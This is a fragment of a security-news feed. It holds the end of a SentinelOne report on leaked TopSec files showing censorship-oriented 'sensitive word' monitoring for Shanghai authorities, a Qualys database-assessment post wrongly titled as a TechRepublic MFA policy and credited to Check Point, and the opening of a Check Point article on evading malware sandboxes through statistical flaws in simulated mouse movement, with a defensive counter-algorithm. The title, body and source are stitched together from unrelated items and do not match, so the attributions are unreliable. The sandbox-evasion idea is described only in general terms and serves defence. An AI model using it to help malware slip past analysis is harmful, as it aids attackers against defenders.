&lt;p&gt;On a technical level, Sparta is a framework that uses GraphQL APIs to receive content from downstream web applications. Work logs indicate that TopSec migrated from a system called Apollo, which is plausibly a reference to &lt;a href="https://github.com/apollographql"&gt;Apollo-GraphQL&lt;/a&gt;, an open-source framework offered by a company based in San Francisco. The work logs also indicate that Sparta is equipped to process Chinese language characters. This suggests that TopSec likely developed Sparta as an in-house solution that is tailored to the localized needs of TopSec’s customers and does not rely on a US-based solution.&lt;/p&gt;
&lt;p&gt;Additionally, we observed a note indicating that detection alerts considered severe are likely distributed to internal teams via WeChat for prioritized handling. WeChat is a widely-used messaging and social media platform in China, known for its broad range of features, including messaging, social networking, and payment services. Its integration into daily life makes it an essential tool for communication and business operations within the country.&lt;/p&gt;
&lt;pre&gt;
Severe monitoring events are sent to corporate WeChat
&lt;/pre&gt;
&lt;p&gt;Since WeChat operates under Chinese regulations, there are significant implications regarding data privacy and government access. Under Chinese laws, such as the &lt;a href="https://digichina.stanford.edu/work/translation-cybersecurity-law-of-the-peoples-republic-of-china-effective-june-1-2017/"&gt;Cybersecurity Law&lt;/a&gt;, companies like Tencent, which owns WeChat, are required to cooperate with government entities, allowing them to access data when requested.&lt;/p&gt;
&lt;h2&gt;Web Content Monitoring&lt;/h2&gt;
&lt;p&gt;Our analysis found that TopSec’s capabilities include web content monitoring, as indicated by references to a service called &lt;code&gt;Website Monitoring Service&lt;/code&gt; and detection events with internal identifiers prefixed with &lt;code&gt;Web&lt;/code&gt;, such as &lt;code&gt;WebTamper&lt;/code&gt;, &lt;code&gt;WebHiddenLink&lt;/code&gt;, &lt;code&gt;WebAvailHttp&lt;/code&gt;, &lt;code&gt;WebDns&lt;/code&gt;, &lt;code&gt;WebTr&lt;/code&gt;, and &lt;code&gt;WebSensitive&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This feature of the platform is likely part of what would have been proposed in response to the bid issued by the Shanghai Pudong Bureau for the &amp;#8220;Cloud Monitoring Service Project&amp;#8221;, offering the Bureau tools to monitor website security and content as part of their broader surveillance and compliance efforts.&lt;/p&gt;
&lt;pre&gt;
Inspect website monitoring-related services
[ . . . ]
[2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553] 2024-06-12T18:00:00 to 2024-06-12T22:00:00 Event volume: 553
WebSensitive 56
WebTamper 149
WebHiddenLink 348
&lt;/pre&gt;
&lt;p&gt;While the exact logic behind how the Web events are triggered remains unclear, the event names and metadata present in the documents provide insight into the purpose of some of these events. For instance, the &lt;code&gt;WebAvailHttp&lt;/code&gt; event is likely triggered when a website is considered unavailable due to its response time (measured in milliseconds as &lt;code&gt;respTimeMs&lt;/code&gt; in the figure below) exceeding a predefined threshold (&lt;code&gt;respThresholdMs&lt;/code&gt;).&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114595" style="width: 330px;"&gt;&lt;img alt="Metadata on the WebAvailHttp event" class="size-full wp-image-114595" height="357" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_17.jpg" width="330" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114595"&gt;Metadata on the &lt;em&gt;WebAvailHttp&lt;/em&gt; event&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Further, the &lt;code&gt;WebHiddenLink&lt;/code&gt; event is likely triggered when web content contains hidden links — links that obscure their destination or mislead users, posing a security risk. Examples include links concealed within small or transparent elements, deceptive anchor text, and styling tricks that make links appear as plain text.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114601" style="width: 423px;"&gt;&lt;img alt="The WebHiddenLink event" class="size-full wp-image-114601" height="92" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_11.jpg" width="423" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114601"&gt;The &lt;em&gt;WebHiddenLink&lt;/em&gt; event&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Web Content Monitoring | Sensitive Words&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;WebSensitive&lt;/code&gt; event is likely triggered when web content contains so-called &lt;a href="https://www.sciencedirect.com/science/article/abs/pii/S2211695822000897"&gt;sensitive words&lt;/a&gt; (敏感词 in Simplified Chinese). These words are related to political criticism, violence, or pornography, and are central to China&amp;#8217;s domestic Internet censorship efforts aimed at ensuring compliance with government policies. Detecting the presence of such words in web content helps prevent the dissemination of information considered inappropriate or harmful by PRC authorities.&lt;/p&gt;
&lt;pre&gt;
Assist the product to check for missed scans and manual analysis and marking errors of sensitive word events
&lt;/pre&gt;
&lt;p&gt;TopSec’s ability to detect sensitive words demonstrates the impact that state policies related to the cyber domain have on the design and implementation of monitoring solutions developed by the private sector in China. These policies shape the strategies and technologies used to monitor, filter, and control online content, ensuring that IT systems comply with governmental regulations and censorship guidelines.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WebSensitive&lt;/code&gt; alerts may be used by private sector organizations to monitor user-generated content on their websites in order to trigger actions such as issuing warnings, deleting content, or restricting access when sensitive words are detected. Government entities may also consume these alerts to track the presence of sensitive words on their own websites or across broader online spaces to enforce compliance with national censorship regulations. For example, the latter may have been an objective of the previously mentioned &amp;#8220;Cloud Monitoring Service Project&amp;#8221; by the Shanghai Pudong Bureau of the Ministry of Public Security.&lt;/p&gt;
&lt;p&gt;We observed a task list indicating a focused effort to ensure consistent monitoring for sensitive words between 7:00 AM and 8:00 AM on the 14th (converted from GMT to China Standard Time), with the month and year not specified. The preceding document content suggests that the reference is to September 2023. One item in the task list instructs verification of the availability and capacity of sensitive word detection capabilities during this period, while another item records the forwarding of &amp;#8216;asset identifiers&amp;#8217; for collected &amp;#8216;validated events&amp;#8217; to an individual named Zhao Nannan (赵楠楠). The task list issuing this instruction very likely includes a typo stating the validated events were from 7:00 AM to 10:00 PM on September 14.&lt;/p&gt;
&lt;pre&gt;
1. 	Plan the probe deployment plan for the web split emergency milestone launch 3h
2. 	Check the number of agents for sensitive words between 23:00 on the 13th (GMT) and 14:00 at 00:00 (排查敏感词13日23点到14点0点之间的代办数量) 2h
3. 	Check cloud baseline 500 errors 1h
4. 	Collect asset identifiers of valid events on the 13th and provide them to Zhao Nannan 1h
5. 	Check the task execution failure of ipv6 probe 1h
&lt;/pre&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114594" style="width: 379px;"&gt;&lt;img alt="Document excerpts indicating sensitive web content actions in September 2023" class="size-full wp-image-114594" height="276" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_18.jpg" width="379" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114594"&gt;Document excerpts indicating sensitive web content actions in September 2023&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The identification of an individual named Zhao Nannan as the likely recipient of this information, alongside the context of the monitoring effort, leads us to conclude with moderate confidence that this effort was in response to political events in Shanghai.&lt;/p&gt;
&lt;p&gt;We identified a woman named Zhao Nannan as having worked at the 3rd Bureau of the Ministry of Public Security in Shanghai, which is &lt;a href="https://web.archive.org/web/20240622033538/https://www.trimps.ac.cn/gass/index.html"&gt;responsible&lt;/a&gt; for network security and technical investigations. Our observations presented earlier in this post suggest close ties between Shanghai-based Bureaus of the Ministry of Public Security and TopSec, one example being TopSec&amp;#8217;s participation in a project bidding process launched by the Shanghai Pudong Bureau.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114596" height="328" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_16.jpg" width="1442" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114593" style="width: 1388px;"&gt;&lt;img alt="Employment affiliation of Zhao Nannan" class="size-full wp-image-114593" height="376" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_2.jpg" width="1388" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114593"&gt;Employment affiliation of Zhao Nannan (Source: LinkedIn)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;However, Zhao Nannan no longer works for the MPS 3rd Bureau in Shanghai. According to an online announcement from the Shanghai State-owned Assets Supervision and Administration Commission (SASAC), Zhao Nannan was one of six successful applicants to SASAC for a network security role. The announcement even references her past role at the MPS 3rd Bureau. Congratulations are due to her, as she scored the highest among the applicants for the role–恭喜!&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-114597" height="624" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_15.jpg" width="1999" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114589" style="width: 1999px;"&gt;&lt;img alt="Zhao Nannan’s role at Shanghai SASAC" class="size-full wp-image-114589" height="624" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_6.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114589"&gt;Zhao Nannan’s role at Shanghai SASA (&lt;a href="https://perma.cc/65UL-57DP" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;On the morning of September 14th, when Zhao Nannan received alerts for sensitive content, her new employer announced on its WeChat account that the head of the Shanghai SASAC, Bai Tinghui, was under investigation for corruption. The news was quickly picked up by the South China Morning Post, Caixing, and other news-reposting blogs in China. The Shanghai government itself confirmed the investigation into Bai Tinghui and his subsequent dismissal one month later.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114592" style="width: 1890px;"&gt;&lt;img alt="News coverage on Bai Tinghui&amp;#039;s investigation" class="size-full wp-image-114592" height="808" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_3.jpg" width="1890" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114592"&gt;News coverage on Bai Tinghui&amp;#8217;s investigation (&lt;a href="https://www.scmp.com/news/china/politics/article/3234543/chinas-corruption-crackdown-puts-5-soes-and-shanghai-state-assets-supervisor-investigation-cross" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114602" style="width: 1536px;"&gt;&lt;img alt="Government confirmation of Bai Tinghui&amp;#039;s dismissal" class="size-full wp-image-114602" height="1116" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_10.jpg" width="1536" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114602"&gt;Government confirmation of Bai Tinghui&amp;#8217;s dismissal (&lt;a href="https://www.shanghai.gov.cn/rsrm2023/20231023/a04677676dd443fd8c38c2a462758ccd.html" target="_blank"&gt;Source&lt;/a&gt;)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Because the Shanghai SASAC posted the news on WeChat, we know that the investigation itself was not subject to censorship. The lack of complete censorship regarding the investigation raises questions about what “validated events” would have been reported to Zhao Nannan following the announcement.&lt;/p&gt;
&lt;p&gt;Currently, only five webpages of the Shanghai SASAC still mention Bai Tinghui. All five pages also mention Bai leading a Party study session of Xi Jinping Thought. It’s unclear why only these pages of Bai Tinghui remain–perhaps his tarnished reputation is outshown by Xi Jinping: it may be hard to delete a website with Xi Jinping’s name on it, even if it is accompanied by a corrupt local official.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114599" style="width: 1088px;"&gt;&lt;img alt="Search results that still show Bai Tinghui’s name on SASAC website" class="size-full wp-image-114599" height="1778" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_13.jpg" width="1088" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114599"&gt;Search results that still show Bai Tinghui’s name on SASAC website&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Intriguingly, the organization that is responsible for investigating the fallen Bai Tinghui, the Shanghai Municipal Commission for Discipline Inspection, is listed among TopSec’s customers in the tooling.&lt;/p&gt;
&lt;p&gt;The downfall of Bai Tinghui and the resulting use of Beijing TopSec’s tooling for coordinated monitoring of politically sensitive content shines a light on the important role cybersecurity companies can play in Chinese politics. The CCP has &lt;a href="https://www.newamerica.org/cybersecurity-initiative/blog/chinas-strategic-thinking-building-power-cyberspace/"&gt;long-acknowledged&lt;/a&gt; that “If our party cannot traverse the hurdle represented by the Internet, it cannot traverse the hurdle of remaining in power for the long term.” This episode provides a compelling example of how corruption investigations expand to rely on the institutions of those being investigated and the cybersecurity companies that service them.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;These leaks yield insight into the complex ecosystem of relationships between government entities and China’s private sector cybersecurity companies. While many countries have significant overlap between government requirements and private sector cybersecurity firms, the ties between these entities in China are much deeper and represent the state’s grasp on managing public opinion through online enforcement.&lt;/p&gt;
&lt;p&gt;The September 2023 situation in Shanghai provides insight into how local and national government interests are enforced through private sector partnerships. The CCP’s strategy of controlling information is multifaceted and requires significant investment in resources that enable the monitoring and alteration of content that citizens engage with. While there are still many unknown factors regarding how such censorship is applied, these findings yield insights into how collaboration occurs between the government and other entities in China.&lt;/p&gt;
&lt;p&gt;The nature of how this data was leaked remains unclear, but the materials show that TopSec engineers were documenting their work in a highly granular way that included entire commands used to perform the outlined tasks. Considering the types of information in this leak, organizations should evaluate how their systems and infrastructure engineers are logging work. Proper credential management is essential to securing sensitive environments. Infrastructure engineers should rely on a secrets manager that integrates with the CI/CD pipeline rather than running commands from playbooks that include hardcoded credentials. This results in only variable names being stored in commands instead of sensitive credentials and lowers the likelihood that an unexpected disclosure could result in further compromise.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&amp;p=114581</guid><category>China</category></item><item><title>Multi-Factor Authentication Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/multifactor-authentication/</link><description>The need to safeguard sensitive data and systems from unauthorized access is always a major concern.

According to the &lt;a href="https://cpl.thalesgroup.com/data-threat-report"&gt;2024 Thales Data Threat Report&lt;/a&gt;, nearly 43% of companies failed at least one compliance audit in the past year. This is a significant concern because audit failures correlate strongly with security incidents—organizations that failed audits were ten times more likely to experience data breaches, with 31% of non-compliant organizations reporting breaches, compared to only 3% among those that met compliance standards. This underscores the essential role of compliance in maintaining data security as new threats evolve.&lt;/p&gt;



&lt;p&gt;The increase in cyber threats, especially ransomware and malware, is driving up the pressure on compliance efforts. Human error is a prominent factor, contributing to a large portion of breaches and complicating the compliance landscape, necessitating robust data management and security practices.&lt;/p&gt;



&lt;p&gt;In response, many organizations are adopting automated compliance solutions, which streamline the audit process and reduce security gaps stemming from human oversight. Automated tools enable organizations to stay audit-ready and more secure, even as regulations change and cyber threats grow more sophisticated.&lt;/p&gt;

&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;h2 class="wp-block-heading" id="the-importance-of-database-compliance-and-challenges"&gt;&lt;strong&gt;The Importance of Database Compliance and Challenges&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Database compliance has become a priority across industries in today&amp;#8217;s data-driven world. With regulations like GDPR, PCI DSS, CIS, and HIPAA imposing stringent requirements, non-compliance poses risks such as data breaches that compromise sensitive information, substantial financial penalties that can affect the organization’s stability, and reputational damage that undermines stakeholder trust. Compliance protects sensitive data, builds customer trust, and maintains an organization’s reputation, and is increasingly vital as regulatory enforcement intensifies. This environment calls for a comprehensive approach to database security management, integrating best practices to keep data secure and compliant.&lt;/p&gt;



&lt;p&gt;Traditional authenticated compliance scans face significant challenges despite offering advantages such as centralized management and scalability. Failing to securely share and manage credentials for database access increases the risk of unauthorized access, creating potential security vulnerabilities.&lt;/p&gt;



&lt;p&gt;Network-based scans can consume substantial bandwidth, potentially impacting system and network performance, particularly in large environments. Authentication and authorization failures are also common, causing delays and requiring repeated attempts to access resources. These failures can slow down the scanning process and affect overall network efficiency.&lt;/p&gt;



&lt;p&gt;Furthermore, remote scanners may struggle to detect issues hidden behind firewalls, VPNs, or complex network configurations. Together, these factors complicate the overall management of compliance scans.&lt;/p&gt;



&lt;p&gt;Qualys Policy Compliance&amp;#8217;s current offering provides comprehensive database compliance policy coverage and offers flexibility through various data collection sensors, such as scanners and cloud agents.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Database-Assessment_2@2x.png"&gt;&lt;img alt="" class="wp-image-37122" height="1254" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Database-Assessment_2@2x.png" width="2114" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;Even though Qualys Scanner encounters challenges like those associated with traditional authenticated remote scanning, it addresses many of these issues by offering long-standing support for database authentication and assessment for policy compliance. With a vast scope of supported databases, Qualys Scanner streamlines the process of scanning and assessing database environments, helping organizations ensure compliance while minimizing performance impact.&lt;/p&gt;



&lt;p&gt;In contrast, the Qualys Cloud Agent has so far only supported OS-level database assessments. Although its scope has been more limited than the Qualys Scanner—primarily focusing on OS-AUTH level controls for specific database technologies—it offers a flexible and secure method for performing assessments, even in complex or challenging environments. There is no network impact, and it is also best suited for assets where you are unable to get credentials, see continuous authentication failures, or have servers that are sensitive to port scans.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Database-Assessment_3@2x.png"&gt;&lt;img alt="" class="wp-image-37123" height="1254" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Database-Assessment_3@2x.png" width="2114" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;While the cloud agent has been excellent at monitoring, it previously lacked the capability to perform comprehensive database assessments due to its inability to log into databases directly.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="introducing-qualys-cloud-agents-database-authentication-and-assessment"&gt;&lt;strong&gt;Introducing Qualys Cloud Agent’s Database Authentication and Assessment&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;To address these challenges head-on, Qualys is enhancing its capabilities with the introduction of a database assessment feature using the Qualys Cloud Agent. This robust, cloud-native solution is designed to continuously monitor and assess databases for compliance with security policies, providing organizations with the tools they need to stay ahead of potential risks. With support for Oracle and MS SQL databases, Qualys Cloud Agent ensures adherence to multiple CIS, DISA, NIST, and many more benchmark policies, reinforcing a strong security posture.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Graphic-4@2x.png"&gt;&lt;img alt="" class="wp-image-37125" height="1254" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Graphic-4@2x.png" width="2114" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;The Cloud Agent&amp;#8217;s Database Authentication and Assessment feature enables secure, automated database assessments by connecting directly to a vault provider to retrieve credentials and authenticate databases. This approach enables organizations to streamline database security management effectively. This innovative approach not only enhances the organization&amp;#8217;s overall security posture but also ensures compliance without the manual overhead traditionally associated with database assessments.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="key-features-of-database-assessment"&gt;&lt;strong&gt;Key Features of Database Assessment&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;1. &lt;strong&gt;Vault and Secret Manager Integration&lt;/strong&gt;: Supports integration with CyberArk Vault and different secret manager types (Credential Provider, Central Credential Provider) for secure database credential management.&lt;/p&gt;



&lt;div style="padding: 56.25% 0 0 0;"&gt;&lt;/div&gt;



&lt;p&gt;2. &lt;strong&gt;Database Assessment Configuration&lt;/strong&gt;: Cloud Agent connects directly to a vault provider (e.g., CyberArk Vault) to securely fetch credentials for Oracle and SQL Server database assessments.&lt;br /&gt;3. &lt;strong&gt;Assessment Management&lt;/strong&gt;: The Assessment tab allows creating, viewing, editing, and deleting database assessments, with options for tagging and assigning profiles.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="benefits-of-the-database-assessment-feature"&gt;&lt;strong&gt;Benefits of the Database Assessment Feature&lt;/strong&gt;&amp;nbsp;&lt;/h2&gt;



&lt;p&gt;1. &lt;strong&gt;Regulatory Compliance&lt;/strong&gt;: The ability to perform policy compliance checks ensures that organizations can meet the stringent requirements of regulations like GDPR, PCI DSS, CIS, ISO, and HIPAA, thereby mitigating the risk of costly penalties.&amp;nbsp;&lt;br /&gt;2. &lt;strong&gt;Enhanced Compliance Posture&lt;/strong&gt;: Identifying misconfigurations early allows organizations to address misconfigurations before they are exploited, improving overall security and compliance. By remediating these issues proactively, companies can reduce the risk of breaches and ensure adherence to regulatory standards, avoiding audit failures and penalties.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/db_assessment.png"&gt;&lt;img alt="" class="wp-image-37126" height="1470" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/db_assessment.png" width="1705" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;3. &lt;strong&gt;Comprehensive Assessments&lt;/strong&gt;: The Qualys Cloud Agent performs in-depth assessments of databases, identifying compliance gaps that could pose risks to the organization.&amp;nbsp;&lt;br /&gt;4. &lt;strong&gt;Continuous Monitoring&lt;/strong&gt;: With real-time monitoring capabilities, organizations can stay informed about their database security status and quickly address any compliance issues as they arise.&amp;nbsp;&lt;br /&gt;5. &lt;strong&gt;Automation&lt;/strong&gt;: The Qualys Cloud Agent performs daily automated scans, eliminating the need for manual scheduling. This lets organizations reduce the time and resources required for manual checks, allowing security teams to focus on strategic initiatives rather than routine compliance tasks.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="how-to-get-started"&gt;&lt;strong&gt;How to Get Started&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;By April 2025, the feature will be enabled by default for all Qualys Policy Compliance-enabled accounts. Until then, customers must contact Qualys support or the respective Technical Account Manager (TAM) to enable the feature.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/the-cat-and-mouse-game-exploiting-statistical-weaknesses-in-human-interaction-anti-evasions/"&gt;The Cat and Mouse Game: Exploiting Statistical Weaknesses in Human Interaction Anti-Evasions&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;/p&gt;


&lt;h2 class="wp-block-heading" id="executive-summary"&gt;Executive Summary&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;We describe, in very general terms, how we were able to evade detection by taking advantage of statistical anomalies in the human interaction modules of several sandbox solutions.&lt;/li&gt;



&lt;li&gt;We provide an alternative algorithm for simulated mouse human interaction, including its specifications, parameters, source code, and several visual demonstrations.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="why-we-care-about-sandbox-emulation"&gt;Why We Care about Sandbox Emulation&lt;/h2&gt;



&lt;p&gt;As a discipline, information security involves a vast web of entry vectors, mitigations, and counter-mitigations. Among these, one of the most impactful points of conflict between attackers and defenders is what happens when binaries are subjected to sandbox emulation. Purely static analysis has been understood to be a game that attackers win, and defenders lose: code can be obfuscated (“packed”, “crypted”, “virtualized”, take your pick), forcing any analysis to first run it in some way in order to understand it. If you can tell anything at all about a binary’s functionality at face value, it’s due to its author’s lack of effort, not their lack of means.&lt;/p&gt;



&lt;p&gt;The same is far from true about sandbox emulation. Countermeasures to sandbox emulations do exist, but each comes with its own baggage, disadvantages, and chance of outright failure. No one-click silver bullet has popularly emerged in the attacker arsenal to just trivialize sandboxes. Some attackers may mistakenly believe they can ‘solve’ sandbox emulation by compiling the&amp;nbsp;&lt;a href="https://github.com/ayoubfaouzi/al-khaser"&gt;al-khaser test suite&lt;/a&gt;&amp;nbsp;into their binary and refusing to run if a test fails, but unlike packing, which is a one-way operation, a test suite like this can be flipped around and used as a shield: anyone operating a sandbox can verify that their sandbox passes all the tests. In this way, paradoxically, by publicizing numerous sandbox evasions, projects like al-khaser have significantly cut down the maneuvering space available to attackers.&lt;/p&gt;



&lt;p&gt;As a result of all this, the sandbox is one of the focal points where malicious campaigns sink or swim. Binaries that will just execute obvious malicious functionality in a sandbox are, in some fundamental sense, naked and ripe for detection, and so attackers are naturally pressured to add sandbox evasions. The moment they do, we’ve flipped the script on them: now&amp;nbsp;&lt;em&gt;they&lt;/em&gt;&amp;nbsp;have to worry about false negatives and false positives. A failed evasion or a falsely triggered evasion both result in the attack chain being cut short. Depending on the attacker’s motivation, this directly equals lost money, lost power, or lost prestige.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="looking-one-step-ahead"&gt;Looking One Step Ahead&lt;/h2&gt;



&lt;p&gt;A natural question to ask is, “Who wins this game in the long run?” That is, if sandboxes and evasions continue to get better, is the natural end result of this process the uber-sandbox that will force binaries to expose all their latent malicious behavior or the uber-evasion that can allow malware to run only when advantageous to attackers? We won’t fully explore this question here, as its scope is huge and involves some notions that we would rather not help find their way to the attacker TTP mainstream (as Lovecraft cautioned, “Do not call up that which you cannot put down”). But we can reasonably discuss some of the next moves attackers might make as long as it’s feasible to get ahead of them.&lt;/p&gt;



&lt;p&gt;Observing the way many evasions work as seen in (e.g.) the al-khaser test suite and taking it at face value can lead to a mistaken mental model where ‘evasions’ must result from simple glitches that can be fixed, or otherwise from naive responses by the sandbox to a query about something: some file, some registry key, a disk drive size, some other artifact. One might complacently reason that sandboxes simply need to ‘fix all the glitches and patch all the query results’, and that sandbox hardening is in this way reduced to going through a gigantic check list and is effectively a solved problem. Unfortunately, this approach falls apart in cases where satisfying the query&amp;nbsp;&lt;em&gt;requires,&lt;/em&gt;&amp;nbsp;in a strong sense, some intrinsic resource that the sandbox does not have access to.&lt;/p&gt;



&lt;p&gt;One example of such a scenario is all evasions having to do with ‘human interaction’. A human is not a simple&amp;nbsp;&lt;code&gt;TRUE&lt;/code&gt;&amp;nbsp;result of a call to&amp;nbsp;&lt;code&gt;IsHumanPresent()&lt;/code&gt;. Humans have behaviors, tendencies, resources, and capabilities. Until such time that every sandbox has a dedicated AI convinced that it is human and going on about its day-to-day routine in a way indistinguishable from one, this is a difficult and, we argue, under-explored frontier in the sandbox evasion space.&lt;/p&gt;



&lt;p&gt;In this article, we first outline an example of such an evasion that bypasses several sandboxes, then provide an implemented mitigation.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="extremely-vague-outline-of-how-the-evasion-works"&gt;Extremely Vague Outline of How the Evasion Works&lt;/h2&gt;



&lt;p&gt;Evasions based on mouse movements are not new. For example, certain strains of malware from the early 2020s would periodically sample the mouse position and wait for the &lt;code&gt;xor&lt;/code&gt; of the X and Y positions to reach a certain value. This was an implicit condition on the number of different values the cursor position would take; it defeated some naive mouse movement emulation algorithms that picked a new random position for the mouse every second or so. This, and some slightly more advanced examples, prompted off-the-shelf sandbox solutions to introduce hardening in the form of less obviously auto-generated mouse movements. One particularly popular movement model used for this purpose is the random walk. Whenever some predetermined amount of time passes, the cursor is moved in some chosen direction by some distance, chosen by a process that has at least some random element.&lt;/p&gt;



&lt;p&gt;It is really not our intention here for this to be a copy-paste-able widget or even a guide for successfully evading sandboxes. So we will not quite give the specifics here, but we will say that in many cases, implementations of random walks are vulnerable to a statistical attack. We created a proof-of-concept binary that evaded detection by several off-the-shelf sandboxes but would reliably trigger whenever we let a human naturally move the cursor for a while using a mouse.&lt;/p&gt;



&lt;p&gt;Having verified that this is possible, we set out to design an algorithm for simulated mouse movement that will resist this attack (and, hopefully, this kind of attack in general; a short discussion on this issue follows the technical exposition).&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="detailed-implementation-of-the-counter-evasion"&gt;Detailed Implementation of the Counter-Evasion&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="top-level-summary"&gt;Top Level Summary&lt;/h3&gt;



&lt;p&gt;The simulated mouse movement algorithm is comprised of the following loop:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Wait&amp;nbsp;\(\text{wait_baseline}\)&amp;nbsp;milliseconds, multiplied by the output of an exponential distribution with a mean parameter \(\mu_{\text{wait}}\).&lt;/li&gt;



&lt;li&gt;Choose the next “target” mouse position \(v_{\text{next}}\) from a Gaussian centered on the current mouse position \(v_{\text{cur}}\), with the coordinates independent and the standard deviation \(\sigma_x\)&amp;nbsp;equal to screen width multiplied by a motility parameter&amp;nbsp;\(m\), with&amp;nbsp;\(0 \leq m \leq \frac{1}{2}\)&amp;nbsp;(and similarly for \(\sigma_y\); if this lands outside the screen boundaries, just pick again.)&lt;/li&gt;



&lt;li&gt;Pick the length of time used to travel from&amp;nbsp;\(v_{\text{cur}}\)&amp;nbsp;to&amp;nbsp;\(v_{\text{next}}\)&amp;nbsp;by sampling from an exponential distribution with a mean&amp;nbsp;\(\mu_{\text{move}}\). Scale the result to the distance&amp;nbsp;\(|v_{\text{next}}-v_{\text{cur}}|\).&lt;/li&gt;



&lt;li&gt;Chart a “path prototype” \(\varphi: [0,1] \rightarrow [0,1]^2\)&amp;nbsp;which will set the rate of advancement from&amp;nbsp;\(v_{\text{cur}}\)&amp;nbsp;to&amp;nbsp;\(v_{\text{next}}\). The axis-wise components of&amp;nbsp;\(\varphi\)&amp;nbsp;are each generated separately, by averaging \(\text{wave_count}\)&amp;nbsp;random ‘waves’. Each ‘wave’ is a sine function with a frequency picked uniformly from 0 to \(\text{max_freq}\)&amp;nbsp;and a random shift picked uniformly from \([0,\tau]\) (&lt;a href="https://tauday.com/tau-manifesto"&gt;for the uninitiated&lt;/a&gt;, \(\tau = 2\pi\)). The sum of these waves is adjusted so that \(f(0)=0\) and \(f(1)=1\).&lt;/li&gt;



&lt;li&gt;Each \(\text{interval}\), update the mouse cursor position along the planned path, until it reaches&amp;nbsp;&amp;nbsp;\(v_{\text{next}}\).&lt;/li&gt;



